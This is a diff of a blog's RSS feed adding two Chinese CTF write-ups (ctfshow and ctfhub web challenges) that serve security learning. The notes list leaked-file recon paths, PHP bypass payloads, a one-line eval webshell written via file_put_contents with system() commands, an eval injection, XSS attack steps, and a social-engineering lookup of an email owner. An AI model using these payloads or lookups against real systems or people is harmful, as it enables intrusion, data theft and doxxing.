@@ -7,7 +7,305 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
         <copyright>Frederick</copyright>
-        <lastBuildDate>Tue, 11 Feb 2025 17:30:05 +0000</lastBuildDate><atom:link href="https://Frederick2313072.github.io/post/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Fri, 14 Feb 2025 11:31:56 +0000</lastBuildDate><atom:link href="https://Frederick2313072.github.io/post/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>ctfshow通关</title>
+        <link>https://Frederick2313072.github.io/p/ctfshow%E9%80%9A%E5%85%B3/</link>
+        <pubDate>Fri, 14 Feb 2025 00:00:00 +0000</pubDate>
+        
+        <guid>https://Frederick2313072.github.io/p/ctfshow%E9%80%9A%E5%85%B3/</guid>
+        <description>&lt;p&gt;web2：view-source是一种协议，早期基本上每个浏览器都支持这个协议。后来Microsoft考虑安全性，对于WindowsXP pack2以及更高版本以后IE就不再支持此协议。但是这个方法在FireFox和Chrome浏览器都还可以使用。 如果要在IE下查看源代码,只能使用查看中的&amp;quot;查看源代码&amp;quot;命令.以前的使用方法：在浏览器地址栏中输入 view-source: URL&lt;/p&gt;
+&lt;p&gt;web3:打开burp suite然后在仪表盘选择新扫描输入url（网址）后点击确定，然后点击目标，选择相应&amp;ndash;raw就可以看见flag了or F12 &amp;mdash;&amp;gt;选择网络&amp;mdash;&amp;gt;F5刷新页面，查看响应头。&lt;/p&gt;
+&lt;p&gt;web4：robots.txt（爬虫协议）&lt;/p&gt;
+&lt;p&gt;web5：目录扫描：index.phps(php文件)&lt;/p&gt;
+&lt;p&gt;phps文件泄露，phps存放着php源码,可通过尝试访问/index.phps读取,或者尝试扫描工具扫描读取.&lt;/p&gt;
+&lt;p&gt;web6：url/www.zip网站备份压缩文件 漏洞成因&lt;/p&gt;
+&lt;p&gt;在网站的升级和维护过程中，通常需要对网站中的文件进行修改。此时就需要对网站整站或者其中某一页面进行备份。&lt;/p&gt;
+&lt;p&gt;当备份文件或者修改过程中的缓存文件因为各种原因而被留在网站 web 目录下，而该目录又没有设置访问权限时，便有可能导致备份文件或者编辑器的缓存文件被下载，导致敏感信息泄露，给服务器的安全埋下隐患。&lt;/p&gt;
+&lt;p&gt;该漏洞的成因主要有是管理员将备份文件放在到 web 服务器可以访问的目录下。&lt;/p&gt;
+&lt;p&gt;该漏洞往往会导致服务器整站源代码或者部分页面的源代码被下载，利用。源代码中所包含的各类敏感信息，如服务器数据库连接信息，服务器配置信息等会因此而泄露，造成巨大的损失。&lt;/p&gt;
+&lt;p&gt;被泄露的源代码还可能会被用于代码审计，进一步利用而对整个系统的安全埋下隐患。&lt;/p&gt;
+&lt;p&gt;.rar .zip .7z .tar.gz .bak .swp .txt&lt;/p&gt;
+&lt;p&gt;源码泄露 url/www.zip 得知隐藏目录/fl000g.txt&lt;/p&gt;
+&lt;p&gt;web7: dirsearch -u url 发现目录 /.git&lt;/p&gt;
+&lt;p&gt;web8 /.svn 代码版本管理工具&lt;/p&gt;
+&lt;p&gt;web9: 本题目的是让答题者了解到vim编辑器使用时会有一个缓存文件，这个缓存文件在保存时进行删除，但是在vim意外退出时这个缓存文件，会以源文件加一个.swp后缀进行保存，我们可以尝试访问这些文件来尝试获取一些文件。&lt;/p&gt;
+&lt;p&gt;/index.php.swp&lt;/p&gt;
+&lt;p&gt;web10:network cookie&lt;/p&gt;
+&lt;p&gt;本题目是让答题者了解到cookie，cookie一般用于在身份认证的过程中保存一些信息，用于服务器来验证身份,在测试中可以尝试注入等方式。可以使用burp/F12中的网络来查看&lt;/p&gt;
+&lt;p&gt;web11:dns查找域名&lt;/p&gt;
+&lt;p&gt;web12:查看robots.txt文件，用户名admin。密码：在页面的最下方 管理员界面：/admin&lt;/p&gt;
+&lt;p&gt;web13:/document.pdf，底部信息&lt;/p&gt;
+&lt;p&gt;本题目的是答题者了解到很多的文章有许多的文档，可以在这些文档中发现很多信息，例如文件中有许多的信息泄露的地方，本题在底部的document这个这个文本中记录到有地址和密码。&lt;/p&gt;
+&lt;p&gt;web14:根据提示 泄露重要(editor)的信息 直接在url后面添加/editor 然后查看flag路径并且访问&lt;/p&gt;
+&lt;p&gt;web15:/admin 忘记密码，密保问题。首先，在网页最下方发现一个邮箱，于是就去QQ上搜索了一下QQ号，只是发现了一个账号，地点是陕西西安，社工搜索，telegram暗精灵&lt;/p&gt;
+&lt;p&gt;web16:考察PHP探针php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。 url后缀名添加/tz.php 版本是雅黑PHP探针，然后查看phpinfo搜索flag&lt;/p&gt;
+&lt;p&gt;web17:/backup.sql 备份的sql文件&lt;/p&gt;
+&lt;p&gt;web18:这是一个javascript 的游戏，游戏的目的就是让要赢，从js代码中可知，当score&amp;gt;120时，且game_over这个参数为false时，即可赢，于是打开开发者模式中的console，直接赋值score=130 game_over=false 然后，执行游戏 的run() 即可得到 &amp;ldquo;你赢了，去幺幺零点皮爱吃皮看看&amp;rdquo;， 即，110.php 打开它，即得flag&lt;/p&gt;
+&lt;p&gt;web19:js查看源码，得知post提交账户密码，用hackbar&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Frederick2313072.github.io/p/ctfshow%E9%80%9A%E5%85%B3/image-20250207213641400.png&#34;
+	width=&#34;1883&#34;
+	height=&#34;1191&#34;
+	srcset=&#34;https://Frederick2313072.github.io/p/ctfshow%E9%80%9A%E5%85%B3/image-20250207213641400_hu_a5a6e9fb0b00fc6d.png 480w, https://Frederick2313072.github.io/p/ctfshow%E9%80%9A%E5%85%B3/image-20250207213641400_hu_7f6e5bfee940185.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;158&#34;
+		data-flex-basis=&#34;379px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;web20：mdb文件是早期asp+access构架的数据库文件 直接查看url路径添加/db/db.mdb 下载文件通过txt打开或者通过EasyAccess.exe打开搜索flag flag{ctfshow_old_database}&lt;/p&gt;
+&lt;p&gt;web89&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;isset()&lt;/code&gt; 用于检查 &lt;code&gt;$_GET[&#39;num&#39;]&lt;/code&gt; 是否存在。如果变量存在且值不为 &lt;code&gt;NULL&lt;/code&gt;，则返回 &lt;code&gt;true&lt;/code&gt;，否则返回 &lt;code&gt;false&lt;/code&gt;。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;preg_match()&lt;/code&gt; 用于检查 &lt;code&gt;$_GET[&#39;num&#39;]&lt;/code&gt; 是否包含数字字符。如果模式匹配到，则返回 &lt;code&gt;1&lt;/code&gt;，否则返回 &lt;code&gt;0&lt;/code&gt;。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;intval()&lt;/code&gt; 用于将 &lt;code&gt;$_GET[&#39;num&#39;]&lt;/code&gt; 转换为整数并检查其是否为非零值。返回变量的整数值&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;利用数组绕过正则表达式，?num[]=1&lt;/p&gt;
+&lt;p&gt;web90&lt;/p&gt;
+&lt;p&gt;绕过十进制，我采用转换成16进制方法，?num=0x117c&lt;/p&gt;
+&lt;p&gt;web91&lt;/p&gt;
+&lt;p&gt;正则表达式修饰符&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/^php$/im
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;/^php$/&lt;/code&gt;：匹配字符串 &amp;ldquo;php&amp;rdquo;。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;i&lt;/code&gt;：忽略大小写。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;m&lt;/code&gt;：多行匹配，若存在换行\n且有开始^或结束$，以换行为分隔符，逐行匹配&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;%0A` 表示换行符（`\n
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;payload：?cmd=%0aphp&lt;/p&gt;
+&lt;p&gt;web92&lt;/p&gt;
+&lt;p&gt;方法一:intval()函数如果$base为0则$var中存在字母的话遇到字母就停止读取 但是e这个字母比较特殊，可以在PHP中不是科学计数法。所以为了绕过前面的==4476我们就可以构造 4476e123 其实不需要是e其他的字母也可以&lt;/p&gt;
+&lt;p&gt;方法二:同web90&lt;/p&gt;
+&lt;p&gt;web93&lt;/p&gt;
+&lt;p&gt;既然不能有字母，传换成八进制，?num=010574&lt;/p&gt;
+&lt;p&gt;web94&lt;/p&gt;
+&lt;p&gt;在93的基础上过滤了开头为0的数字 这样的话就不能使用进制转换来进行操作 我们可以使用小数点来进行操作。这样通过intval()函数就可以变为int类型的4476 ?num=4476.0&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;if(!strpos($num, &amp;#34;0&amp;#34;))//0不能放在第一位
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;web95&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;if(preg_match(&amp;#34;/[a-z]|\./i&amp;#34;, $num))//点匹配没了
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;可以通过8进制绕过但是前面必须多加一个字节 ?num=+010574或者?num=%2b010574&lt;/p&gt;
+&lt;p&gt;web96&lt;/p&gt;
+&lt;p&gt;在linux下面表示当前目录是 ./ 所以我们的payload： u=./flag.php&lt;/p&gt;
+&lt;p&gt;不能直接?u=flag.php会被过滤&lt;/p&gt;
+&lt;p&gt;web97（这题不太懂其实）&lt;/p&gt;
+&lt;p&gt;md5绕过原理：md5对数组是不予加密的，但是这个函数是返回值类型的，没有返回对象，便是返回null（null是无对象的意思，可以理解为没有目标）,所以两个都是null，可以绕过里面的比较，但是外面还有一个a!=b,绕过姿势为：?a[]=1&amp;amp;b[]=2&lt;/p&gt;
+&lt;p&gt;web98&lt;/p&gt;
+&lt;p&gt;三元运算符，if使用&lt;/p&gt;
+&lt;p&gt;(expr1)?(expr2)：(expr3)&lt;/p&gt;
+&lt;p&gt;如果expr1成立，则执行expr2，否则执行expr3&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$_GET=&amp;amp;$_POST;//只要有输入的get参数就将get方法改变为post方法
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;我们只需要 GET一个?HTTP_FLAG=flag 加 POST一个HTTP_FLAG=flag,get直接url？，post用hackbar&lt;/p&gt;
+&lt;p&gt;web99&lt;/p&gt;
+&lt;p&gt;file_put_contents()写入文件&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;弱类型中当php字符串和int比较时&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;字符串会被转换成int，所以&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;字符串中数字后面的字符串会被忽略。题目中的in_array没有设置type&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;我们可以输入字符串5&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;此处数字随意，只要在rand&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x36d&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;之间即可&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;转换之后也就是5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;明显是在题目中生成的数组中的&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;满足条件，同时进入下一步后，我们就可将一句话木马写入了5&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php中&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;get:?n=5.php post:content=&lt;?php @eval=$_POST=[&#39;hack&#39;];?&gt;&lt;/p&gt;
+&lt;p&gt;查看post:content=&lt;?php system(&#39;ls&#39;);?&gt; ,查看flag：content=&lt;?php system(&#39;tac flag36d.php&#39;);?&gt;&lt;/p&gt;
+&lt;p&gt;web100&lt;/p&gt;
+&lt;p&gt;三个参数 v1 ，v2 ，v3，其中v0 实际上只会去判断v1是否为数字 ，因此v1 = 1234 数字即可&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$v0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/\;/&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$v2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)){&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# 表示v2中不能有符号 ；
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/\;/&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$v3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)){&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;#表示v3 中必须要有 ;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;            &lt;span class=&#34;k&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$v2&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;(&amp;#39;ctfshow&amp;#39;)&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$v3&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# 这里是eval中 拼接v2 v3 
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;v2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;var_dump&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$ctfshow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;/*
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;v3=*/&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;拼接起来就是var_dump($ctfshow)/ &lt;em&gt;(&amp;lsquo;ctfshow&amp;rsquo;)&lt;/em&gt; / ; 可以执行&lt;/p&gt;
+&lt;p&gt;v2 也可以用其他显示输出的函数&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;v2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;print_r&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$ctfshow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;/*&amp;amp;v3=*/&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;注意拼接之后要把v3注释掉，flag要把02xd换成-&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>ctfhub-web</title>
+        <link>https://Frederick2313072.github.io/p/ctfhub-web/</link>
+        <pubDate>Sat, 08 Feb 2025 00:00:00 +0000</pubDate>
+        
+        <guid>https://Frederick2313072.github.io/p/ctfhub-web/</guid>
+        <description>&lt;p&gt;HTTP请求：抓包，把GET换成CTFHUB&lt;/p&gt;
+&lt;p&gt;302跳转：网页临时移动到新的位置，而浏览器的缓存没有更新，flag在index.php下而跳转到index.html打开burp suite抓包，发送请求&lt;/p&gt;
+&lt;p&gt;cookie:验证身份 抓包repeater模块改成admin=1发送请求&lt;/p&gt;
+&lt;p&gt;基础认证：burpsuite字典爆破，加密&lt;/p&gt;
+&lt;p&gt;sql注入：结合burpsuite（前端没有回显），hackbar&lt;/p&gt;
+&lt;h2 id=&#34;xss攻击&#34;&gt;XSS攻击
+&lt;/h2&gt;&lt;p&gt;找一个xss网站，我找的是xssaq.com&lt;/p&gt;
+&lt;h3 id=&#34;反射型xss&#34;&gt;反射型XSS
+&lt;/h3&gt;&lt;p&gt;恶意JavaScript脚本属于用户发送给网站请求中的一部分，随后网站又将这部分返回给用户，恶意脚本在页面中被执行。一般发生在前后端一体的应用中，服务端逻辑会改变最终的网页代码。&lt;/p&gt;
+&lt;p&gt;攻击步骤&lt;/p&gt;
+&lt;p&gt;1.攻击者构造出特殊的 URL，其中包含恶意代码。
+2.用户打开带有恶意代码的 URL 时，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器。
+3.用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。
+4.恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。&lt;/p&gt;
+&lt;p&gt;由于HTML文档具有扁平的、串行的结构，混合了控制语句、格式和实际内容，因此在结果页面中包含任何未经验证的用户提供的数据而没有进行正确的HTML编码，可能导致标记注入。一个经典的潜在攻击向量例子是站点搜索引擎：如果用户搜索一个字符串，搜索字符串通常会在结果页面上逐字显示，以表明搜索内容。如果该响应没有正确转义或拒绝HTML控制字符，就会导致跨站脚本漏洞。&lt;/p&gt;
+&lt;p&gt;反射型攻击通常通过电子邮件或一个中立的网站传递。诱饵是一个看似无害的URL，指向一个可信赖的网站，但包含XSS攻击向量。如果该可信赖的网站对该向量存在漏洞，点击链接可能会导致受害者的浏览器执行注入的脚本。&lt;/p&gt;
+&lt;p&gt;这里用最经典的paylaod来进行判断是否存在xss&lt;/p&gt;
+&lt;script&gt;alert(1)&lt;/script&gt;//这是语句是让浏览器弹框
+&lt;p&gt;题目中第二个输入框模拟受害者访问，这里的payload需要从xss平台中复制&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Frederick2313072.github.io/p/ctfhub-web/image-20250210002218405.png&#34;
+	width=&#34;2160&#34;
+	height=&#34;745&#34;
+	srcset=&#34;https://Frederick2313072.github.io/p/ctfhub-web/image-20250210002218405_hu_cb12ff6580782970.png 480w, https://Frederick2313072.github.io/p/ctfhub-web/image-20250210002218405_hu_320034864e4c6f84.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;289&#34;
+		data-flex-basis=&#34;695px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;在XSS网站上&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Frederick2313072.github.io/p/ctfhub-web/image-20250210002314603.png&#34;
+	width=&#34;2798&#34;
+	height=&#34;1490&#34;
+	srcset=&#34;https://Frederick2313072.github.io/p/ctfhub-web/image-20250210002314603_hu_5ee597879623d070.png 480w, https://Frederick2313072.github.io/p/ctfhub-web/image-20250210002314603_hu_bbd09783123db7c4.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;187&#34;
+		data-flex-basis=&#34;450px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;存储型xss&#34;&gt;存储型XSS
+&lt;/h2&gt;&lt;p&gt;黑客将恶意 JavaScript 脚本长期保存在服务端数据库中，用户一旦访问相关页面数据，恶意脚本就会被执行。常见于搜索、微博、社区贴吧评论等。
+存储型 XSS 的攻击步骤：&lt;/p&gt;
+&lt;p&gt;1.攻击者将恶意代码提交到目标网站的数据库中。
